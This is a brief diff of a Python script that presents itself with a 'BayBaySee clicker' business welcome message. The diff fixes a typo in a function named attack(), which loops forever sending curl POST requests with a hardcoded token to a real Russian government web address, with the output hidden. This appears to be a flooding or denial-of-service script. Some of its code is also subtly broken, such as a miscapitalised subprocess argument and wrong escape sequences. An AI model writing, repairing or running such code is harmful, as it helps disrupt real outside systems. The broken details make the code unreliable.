@@ -41,7 +41,7 @@ def starting():
 	time.sleep(1)
 	print("/n/t/t/t Welcome to you the BayBaySee  clicker where your business grows fastest with lowest investment")
 	time.sleep(1)
-det attack():
+def attack():
 	while True:
 		token = "CaP9l5efMekDeTaZR37c2qKcqhzR2wekoucaX2vCWWS2Gy6x8dJ7KBpXMD5ixIqj"
 		subprocess.call("curl -X post -d "+token+", "+myep+"  http://en.kremlin.ru/robots.php",Shell=True, stdout=subprocess.DEVNULL)
